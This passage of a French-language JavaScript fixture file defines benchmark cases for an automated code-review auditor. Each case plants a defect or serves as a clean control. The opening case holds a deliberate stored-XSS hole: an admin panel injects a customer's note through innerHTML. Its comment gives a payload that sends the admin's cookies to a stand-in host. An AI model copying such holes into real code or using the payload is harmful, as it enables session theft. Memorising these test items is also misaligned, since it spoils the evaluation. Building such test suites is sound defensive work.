          <option value="toutes">Tous les statuts</option>
          {STATUTS.map((statut) => (
            <option key={statut} value={statut}>
              {LIBELLES[statut]}
            </option>
          ))}
        </select>
      </div>

      <table className="admin-commandes__table">
        <caption>Commandes, de la plus récente à la plus ancienne</caption>
        <thead>
          <tr>
            <th scope="col">Référence</th>
            <th scope="col">Client</th>
            <th scope="col">Total</th>
            <th scope="col">Statut</th>
            <th scope="col">Action</th>
          </tr>
        </thead>
        <tbody>
          {visibles.map((commande) => (
            <tr key={commande.reference}>
              <th scope="row">{commande.reference}</th>
              <td>{commande.client.nom}</td>
              <td>{formatPrix(commande.totalCents)}</td>
              <td>{LIBELLES[commande.statut]}</td>
              <td>
                <button type="button" onClick={() => setSelection(commande)}>
                  Détail
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {selection && <PanneauDetail commande={selection} surFermeture={() => setSelection(null)} surStatut={surChangementStatut} />}
    </section>
  )
}

function PanneauDetail({ commande, surFermeture, surStatut }) {
  const zoneNote = useRef(null)

  // La note libre saisie par le CLIENT est réinjectée telle quelle dans le DOM.
  // Un client qui écrit <img src=x onerror="fetch('https://vol.example/'+document.cookie)">
  // exécute son script dans la session de l'opérateur, qui est administrateur.
  useEffect(() => {
    if (!zoneNote.current) return
    zoneNote.current.innerHTML = commande.noteClient ?? ''
  }, [commande.noteClient])

  return (
    <div className="admin-commandes__detail" role="dialog" aria-label={\`Commande \${commande.reference}\`}>
      <h2>Commande {commande.reference}</h2>
      <p>
        Client : {commande.client.nom} — {commande.client.email}
      </p>

      <h3>Articles</h3>
      <ul>
        {commande.lignes.map((ligne) => (
          <li key={ligne.sku}>
            {ligne.quantite} × {ligne.libelle} — {formatPrix(ligne.prixCents)}
          </li>
        ))}
      </ul>

      <h3>Adresse de livraison</h3>
      <address>{escapeHtml(commande.adresse)}</address>

      <h3>Note du client</h3>
      <div ref={zoneNote} className="admin-commandes__note" />

      <label htmlFor="statut-detail">Changer le statut</label>
      <select
        id="statut-detail"
        value={commande.statut}
        onChange={(e) => surStatut(commande.reference, e.target.value)}
      >
        {STATUTS.map((statut) => (
          <option key={statut} value={statut}>
            {LIBELLES[statut]}
          </option>
        ))}
      </select>

      <button type="button" onClick={surFermeture}>
        Fermer
      </button>
    </div>
  )
}
`,
      },
      {
        path: 'src/utils/html.js',
        content: `const REMPLACEMENTS = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }

export function escapeHtml(texte) {
  return String(texte ?? '').replace(/[&<>"']/g, (c) => REMPLACEMENTS[c])
}
`,
      },
    ],
  },
  {
    // Le jumeau propre du précédent : même longueur, même domaine, du HTML manipulé
    // AUSSI — mais assaini. C'est le cas qui piège un auditeur réagissant au mot-clé
    // "innerHTML" plutôt qu'à ce que le code fait réellement.
    id: 'LONG-04-service-commandes-propre',
    defect:
      "RIEN — service de ~200 lignes : requêtes paramétrées, HTML assaini avant insertion, " +
      'secrets côté serveur uniquement, pas de dépendance lourde.',
    location: 'server/services/commandes.js',
    rule: 'Contrôle négatif long (OWASP A03/A05)',
    expect: { security: 'pass', architecture: 'pass', performance: 'pass' },
    testsElsewhereInProject: true,
    files: [
      {
        path: 'server/services/commandes.js',
        content: `import { pool } from '../db.js'
import { escapeHtml } from '../utils/html.js'
import { journaliser } from '../utils/journal.js'

const STATUTS_VALIDES = new Set(['en-attente', 'payee', 'expediee', 'livree', 'annulee'])
const TRANSITIONS = {
  'en-attente': ['payee', 'annulee'],
  payee: ['expediee', 'annulee'],
  expediee: ['livree'],
  livree: [],
  annulee: [],
}
const PAGE_MAX = 100

export class ErreurMetier extends Error {
  constructor(message, code) {
    super(message)
    this.name = 'ErreurMetier'
    this.code = code
  }
}

function bornerPagination(limite, decalage) {
  const l = Number.parseInt(limite, 10)
  const d = Number.parseInt(decalage, 10)
  return {
    limite: Number.isFinite(l) ? Math.min(Math.max(l, 1), PAGE_MAX) : 25,
    decalage: Number.isFinite(d) && d > 0 ? d : 0,
  }
}

export async function listerCommandes({ statut, recherche, limite, decalage } = {}) {
  const conditions = []
  const parametres = []

  if (statut) {
    if (!STATUTS_VALIDES.has(statut)) throw new ErreurMetier(\`Statut inconnu : \${statut}\`, 'STATUT_INCONNU')
    parametres.push(statut)
    conditions.push(\`c.statut = $\${parametres.length}\`)
  }

  if (recherche) {
    // Requête PARAMÉTRÉE : le terme de recherche ne rejoint jamais le texte SQL.
    parametres.push(\`%\${recherche}%\`)
    conditions.push(\`(c.reference ILIKE $\${parametres.length} OR cl.nom ILIKE $\${parametres.length})\`)
  }

  const { limite: l, decalage: d } = bornerPagination(limite, decalage)
  parametres.push(l, d)

  const sql = \`
    SELECT c.reference, c.statut, c.total_cents, c.creee_le,
           cl.nom AS client_nom, cl.email AS client_email
      FROM commandes c
      JOIN clients cl ON cl.id = c.client_id
     \${conditions.length ? \`WHERE \${conditions.join(' AND ')}\` : ''}
     ORDER BY c.creee_le DESC
     LIMIT $\${parametres.length - 1} OFFSET $\${parametres.length}
  \`

  const { rows } = await pool.query(sql, parametres)
  return rows.map(enCommande)
}

function enCommande(ligne) {
  return {
    reference: ligne.reference,
    statut: ligne.statut,
    totalCents: Number(ligne.total_cents),
    creeeLe: ligne.creee_le,
    client: { nom: ligne.client_nom, email: ligne.client_email },
  }
}

export async function detailCommande(reference) {
  const { rows } = await pool.query(
    \`SELECT c.reference, c.statut, c.total_cents, c.creee_le, c.note_client, c.adresse,
            cl.nom AS client_nom, cl.email AS client_email
       FROM commandes c
       JOIN clients cl ON cl.id = c.client_id
      WHERE c.reference = $1\`,
    [reference],
  )
  if (rows.length === 0) throw new ErreurMetier('Commande introuvable', 'INTROUVABLE')

  const commande = enCommande(rows[0])
  const { rows: lignes } = await pool.query(
    'SELECT sku, libelle, quantite, prix_cents FROM commande_lignes WHERE commande_reference = $1 ORDER BY sku',
    [reference],
  )

  return {
    ...commande,
    adresse: rows[0].adresse,
    // La note est saisie par le client : elle est assainie ICI, une fois, avant de
    // sortir du service. Aucun appelant n'a à s'en souvenir.
    noteClientHtml: escapeHtml(rows[0].note_client ?? ''),
    lignes: lignes.map((l) => ({
      sku: l.sku,
      libelle: l.libelle,
      quantite: Number(l.quantite),
      prixCents: Number(l.prix_cents),
    })),
  }
}

export async function changerStatut(reference, nouveau, operateurId) {
  if (!STATUTS_VALIDES.has(nouveau)) throw new ErreurMetier(\`Statut inconnu : \${nouveau}\`, 'STATUT_INCONNU')

  const client = await pool.connect()
  try {
    await client.query('BEGIN')
    const { rows } = await client.query('SELECT statut FROM commandes WHERE reference = $1 FOR UPDATE', [reference])
    if (rows.length === 0) throw new ErreurMetier('Commande introuvable', 'INTROUVABLE')

    const actuel = rows[0].statut
    if (!TRANSITIONS[actuel].includes(nouveau)) {
      throw new ErreurMetier(\`Transition refusée : \${actuel} → \${nouveau}\`, 'TRANSITION_REFUSEE')
    }

    await client.query('UPDATE commandes SET statut = $1, maj_le = now() WHERE reference = $2', [nouveau, reference])
    await client.query(
      'INSERT INTO commande_journal (commande_reference, ancien_statut, nouveau_statut, operateur_id) VALUES ($1, $2, $3, $4)',
      [reference, actuel, nouveau, operateurId],
    )
    await client.query('COMMIT')
    journaliser('commande.statut', { reference, de: actuel, vers: nouveau, operateurId })
    return { reference, statut: nouveau }
  } catch (err) {
    await client.query('ROLLBACK')
    throw err
  } finally {
    client.release()
  }
}

export async function totauxParStatut() {
  const { rows } = await pool.query(
    'SELECT statut, count(*)::int AS nombre, coalesce(sum(total_cents), 0)::bigint AS total_cents FROM commandes GROUP BY statut',
  )
  const totaux = {}
  for (const statut of STATUTS_VALIDES) totaux[statut] = { nombre: 0, totalCents: 0 }
  for (const ligne of rows) {
    totaux[ligne.statut] = { nombre: ligne.nombre, totalCents: Number(ligne.total_cents) }
  }
  return totaux
}
`,
      },
      {
        path: 'server/utils/html.js',
        content: `const REMPLACEMENTS = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }

export function escapeHtml(texte) {
  return String(texte ?? '').replace(/[&<>"']/g, (c) => REMPLACEMENTS[c])
}
`,
      },
    ],
  },

  // ───────────────────────────────────────────────────────────────────────────
  // (2026-08-05, 2ᵉ vague) La 1ʳᵉ mesure LONG n'exerçait que 4 branches sur 6, et
  // seulement DEUX avec un vrai défaut (security, performance). « La détection survit
  // à l'enfouissement » n'était donc établi que pour celles-là. Ces trois cas ferment
  // le trou sur les deux autres branches BLOQUANTES : tests et architecture.
  // ───────────────────────────────────────────────────────────────────────────

  {
    id: 'LONG-05-facturation-non-testee',
    defect:
      'Logique de facturation non triviale (paliers de remise, prorata, TVA par pays, ' +
      "répartition d'avoir au centime) et AUCUN fichier de test nulle part dans le projet.",
    location: 'src/lib/facturation.js — 130 lignes de règles métier, zéro test',
    rule: 'Couverture de test de la logique métier',
    expect: { tests: 'fail' },
    // Le signal projet est DÉTERMINISTE (balayage complet du disque) et dit « aucun test ».
    // C'est précisément la configuration où la branche a le droit de conclure par absence.
    testsElsewhereInProject: false,
    files: [{ path: 'src/lib/facturation.js', content: FACTURATION }],
  },
  {
    // Contrôle POSITIF, sur le modèle de TEST-02 du corpus court. Sans lui, une branche
    // qui répondrait « fail » à tout fichier long obtiendrait 100 % de détection ici.
    // C'est la moitié de la mesure, pas un supplément.
    id: 'LONG-06-facturation-testee',
    defect:
      'RIEN — LA MÊME logique de facturation, accompagnée de ses tests (paliers, prorata, ' +
      'TVA, avoir, cas limites). Ne doit PAS être rejetée.',
    location: 'src/lib/facturation.js + src/lib/facturation.test.js',
    rule: 'Contrôle positif long — la logique EST testée',
    expect: { tests: 'pass' },
    testsElsewhereInProject: true,
    files: [
      { path: 'src/lib/facturation.js', content: FACTURATION },
      { path: 'src/lib/facturation.test.js', content: FACTURATION_TESTS },
    ],
  },
  {
    id: 'LONG-07-couplage-ui-db-enfoui',
    defect:
      'Un composant de PRÉSENTATION interroge directement la base : import du client ' +
      'Supabase et requête SQL dans le composant, au lieu de passer par une couche service.',
    location: 'src/components/TableauBordVentes.jsx — chargerMarges(), dernier tiers',
    rule: 'Architecture — séparation présentation / accès aux données',
    expect: { architecture: 'fail' },
    testsElsewhereInProject: true,
    // ⚠️ PIÈGE DE MESURE à vérifier À LA MAIN dans le rapport : un fichier long peut être
    // rejeté pour « composant monolithe » plutôt que pour le couplage injecté — ce serait
    // la bonne réponse pour la mauvaise raison, et un point de détection imMérité. Le
    // fichier est donc découpé en petites fonctions nommées, avec la logique d'affichage
    // sortie dans des sous-composants : la seule violation réellement disponible est
    // l'accès direct à la base. Contrôle négatif apparié : LONG-04 (long ET propre).
    files: [
      {
        path: 'src/components/TableauBordVentes.jsx',
        content: `import { useEffect, useMemo, useState } from 'react'
import { createClient } from '@supabase/supabase-js'
import { formatPrix } from '../utils/prix.js'
import CarteIndicateur from './CarteIndicateur.jsx'
import TableauMarges from './TableauMarges.jsx'

const PERIODES = [
  { id: '7j', libelle: '7 derniers jours', jours: 7 },
  { id: '30j', libelle: '30 derniers jours', jours: 30 },
  { id: '90j', libelle: '90 derniers jours', jours: 90 },
]

function bornesPeriode(jours) {
  const fin = new Date()
  const debut = new Date(fin)
  debut.setDate(debut.getDate() - jours)
  return { debut: debut.toISOString(), fin: fin.toISOString() }
}

function totalCents(lignes, champ) {
  return lignes.reduce((somme, l) => somme + (l[champ] ?? 0), 0)
}

function tauxMarge(caCents, coutCents) {
  if (caCents <= 0) return 0
  return (caCents - coutCents) / caCents
}

function classerParCanal(lignes) {
  const parCanal = new Map()
  for (const l of lignes) {
    const actuel = parCanal.get(l.canal) ?? { canal: l.canal, caCents: 0, coutCents: 0 }
    actuel.caCents += l.ca_cents ?? 0
    actuel.coutCents += l.cout_cents ?? 0
    parCanal.set(l.canal, actuel)
  }
  return [...parCanal.values()].sort((a, b) => b.caCents - a.caCents)
}

function EnteteTableauBord({ periode, surPeriode }) {
  return (
    <header className="tdb__entete">
      <h1>Ventes et marges</h1>
      <label htmlFor="periode-tdb">Période</label>
      <select id="periode-tdb" value={periode} onChange={(e) => surPeriode(e.target.value)}>
        {PERIODES.map((p) => (
          <option key={p.id} value={p.id}>
            {p.libelle}
          </option>
        ))}
      </select>
    </header>
  )
}

function BandeauIndicateurs({ caCents, coutCents, nbCommandes }) {
  const marge = tauxMarge(caCents, coutCents)
  return (
    <div className="tdb__indicateurs">
      <CarteIndicateur titre="Chiffre d'affaires" valeur={formatPrix(caCents)} />
      <CarteIndicateur titre="Coût des ventes" valeur={formatPrix(coutCents)} />
      <CarteIndicateur titre="Marge brute" valeur={\`\${Math.round(marge * 100)} %\`} />
      <CarteIndicateur titre="Commandes" valeur={String(nbCommandes)} />
    </div>
  )
}

export default function TableauBordVentes({ utilisateur }) {
  const [periode, setPeriode] = useState('30j')
  const [lignes, setLignes] = useState([])
  const [chargement, setChargement] = useState(true)
  const [erreur, setErreur] = useState(null)

  useEffect(() => {
    let annule = false
    setChargement(true)
    chargerMarges(periode)
      .then((donnees) => {
        if (!annule) {
          setLignes(donnees)
          setErreur(null)
        }
      })
      .catch((err) => {
        if (!annule) setErreur(err.message ?? 'Chargement impossible')
      })
      .finally(() => {
        if (!annule) setChargement(false)
      })
    return () => {
      annule = true
    }
  }, [periode])

  const parCanal = useMemo(() => classerParCanal(lignes), [lignes])
  const caCents = useMemo(() => totalCents(lignes, 'ca_cents'), [lignes])
  const coutCents = useMemo(() => totalCents(lignes, 'cout_cents'), [lignes])

  if (chargement) {
    return (
      <p role="status" aria-live="polite">
        Chargement du tableau de bord…
      </p>
    )
  }

  if (erreur) {
    return (
      <p role="alert" className="tdb__erreur">
        {erreur}
      </p>
    )
  }

  return (
    <section className="tdb" aria-labelledby="titre-tdb">
      <EnteteTableauBord periode={periode} surPeriode={setPeriode} />
      <BandeauIndicateurs caCents={caCents} coutCents={coutCents} nbCommandes={lignes.length} />
      <TableauMarges lignes={parCanal} />
      <footer className="tdb__pied">
        <p>
          Vue préparée pour {utilisateur.nom} — {parCanal.length} canal(aux) sur la période.
        </p>
      </footer>
    </section>
  )
}

// Le composant de présentation ouvre lui-même une connexion à la base et écrit sa
// propre requête. Aucune couche service entre l'écran et le schéma : la moindre
// évolution de table casse le composant, la requête n'est ni testable ni réutilisable,
// et l'URL comme la clé sont résolues côté client.
const db = createClient(import.meta.env.VITE_SUPABASE_URL, import.meta.env.VITE_SUPABASE_ANON_KEY)

async function chargerMarges(periodeId) {
  const p = PERIODES.find((x) => x.id === periodeId) ?? PERIODES[1]
  const { debut, fin } = bornesPeriode(p.jours)

  const { data, error } = await db
    .from('ventes_lignes')
    .select('canal, ca_cents, cout_cents, cree_le')
    .gte('cree_le', debut)
    .lte('cree_le', fin)
    .order('cree_le', { ascending: false })

  if (error) throw new Error(error.message)
  return data ?? []
}
`,
      },
      {
        path: 'src/components/CarteIndicateur.jsx',
        content: `export default function CarteIndicateur({ titre, valeur }) {
  return (
    <article className="carte-indicateur">
      <h2>{titre}</h2>
      <p className="carte-indicateur__valeur">{valeur}</p>
    </article>
  )
}
`,
      },
    ],
  },

  // ───────────────────────────────────────────────────────────────────────────
  // (2026-08-05, 3ᵉ vague) Accessibilité était la DERNIÈRE branche bloquante sans
  // cas de détection sur du code long : elle n'avait qu'un contrôle négatif
  // (LONG-01). « La détection survit à l'enfouissement » n'était donc pas établi
  // pour elle. Paire construite sur le corps partagé, comme LONG-01/LONG-02.
  // ───────────────────────────────────────────────────────────────────────────

  {
    // Le jumeau propre. Il compte autant que le fautif : une branche qui répondrait
    // « fail » à tout formulaire long obtiendrait 100 % de détection sans lui.
    id: 'LONG-08-parametres-propre',
    defect:
      'RIEN — page de paramètres de ~200 lignes, accessible de bout en bout : chaque champ ' +
      'a son <label htmlFor>, les groupes ont fieldset/legend, l\'avatar a un alt utile, les ' +
      'messages passent par une région aria-live, et toutes les commandes sont de vrais <button>.',
    location: 'src/pages/ParametresCompte.jsx',
    rule: 'Contrôle négatif long (WCAG 2.2)',
    expect: { accessibility: 'pass' },
    testsElsewhereInProject: true,
    files: [
      {
        path: 'src/pages/ParametresCompte.jsx',
        content: PARAMETRES_TETE + sectionSessions(true) + PARAMETRES_PIED,
      },
      { path: 'src/components/CarteAppareil.jsx', content: CARTE_APPAREIL },
    ],
  },
  {
    id: 'LONG-09-parametres-div-cliquable',
    defect:
      'Commande « Révoquer » rendue en <div onClick> — sans rôle, sans tabIndex, sans gestion ' +
      'clavier. Inatteignable au clavier et invisible aux technologies d\'assistance, alors que ' +
      'TOUTES les autres commandes de la page sont de vrais <button>.',
    location: 'src/pages/ParametresCompte.jsx — section « Sessions actives », dernier tiers',
    rule: 'WCAG 2.2 — 2.1.1 (Clavier) / 4.1.2 (Nom, rôle, valeur)',
    expect: { accessibility: 'fail' },
    testsElsewhereInProject: true,
    // ⚠️ PIÈGE DE MESURE, à vérifier À LA MAIN comme pour LONG-07 : une page de
    // formulaire longue offre beaucoup de prises à un auditeur d'accessibilité. Si
    // la branche répond « fail » en citant un label manquant ou un contraste, c'est
    // la bonne réponse pour la mauvaise raison — le voisinage est irréprochable
    // précisément pour que la seule violation disponible soit le div cliquable.
    files: [
      {
        path: 'src/pages/ParametresCompte.jsx',
        content: PARAMETRES_TETE + sectionSessions(false) + PARAMETRES_PIED,
      },
      { path: 'src/components/CarteAppareil.jsx', content: CARTE_APPAREIL },
    ],
  },
]
